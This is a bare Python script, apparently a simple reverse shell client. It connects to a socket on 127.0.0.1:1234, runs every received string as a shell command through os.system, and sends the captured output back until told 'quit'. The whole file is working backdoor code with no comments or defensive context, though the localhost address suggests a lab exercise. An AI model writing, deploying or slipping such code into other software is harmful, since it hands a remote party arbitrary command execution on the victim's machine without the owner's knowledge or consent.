import socket
import os


s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)

s.connect(('127.0.0.1',1234))

msg = s.recv(2048).decode()

while msg!='quit':
    
    appender = " > log.txt 2>&1"
    
    cmd = msg + appender
    os.system(cmd)
    
    f = open("log.txt","r")
    msg = f.read()
    f.close()
    
    s.send(msg.encode())
    
    msg = s.recv(2048).decode()

s.close()
